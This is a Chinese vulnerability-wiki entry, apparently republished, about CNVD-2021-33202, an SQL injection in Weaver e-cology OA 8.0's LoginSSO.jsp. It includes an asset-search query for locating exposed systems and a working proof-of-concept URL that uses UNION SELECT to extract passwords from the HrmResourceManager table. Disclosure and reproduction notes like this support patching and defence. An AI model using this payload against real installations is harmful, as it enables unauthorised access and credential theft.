---
title: "泛微OA E-Cology LoginSSO.jsp SQL注入漏洞 CNVD-2021-33202"
date: 2026-10-17 09:12:26
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "泛微OA"
tags:
  - "泛微OA"
  - "SQL注入"
  - "代码执行"
  - "信息泄露"
  - "CNVD-2021-33202"
  - "漏洞复现"
---
## 漏洞描述

泛微e-cology是专为大中型企业制作的OA办公系统,支持PC端、移动端和微信端同时办公等。 泛微e-cology存在SQL注入漏洞。攻击者可利用该漏洞获取敏感信息。

## 漏洞影响

```
泛微e-cology 8.0
```

## 网络测绘

```
app="泛微-协同办公OA"
```

## 漏洞复现

登录页面

![image-20220520133932334](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201339405.png)

验证POC

```
/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager
```

![image-20220520134011931](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201340985.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E6%B3%9B%E5%BE%AEOA-E-Cology-LoginSSO.jsp-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CNVD-2021-33202.md)
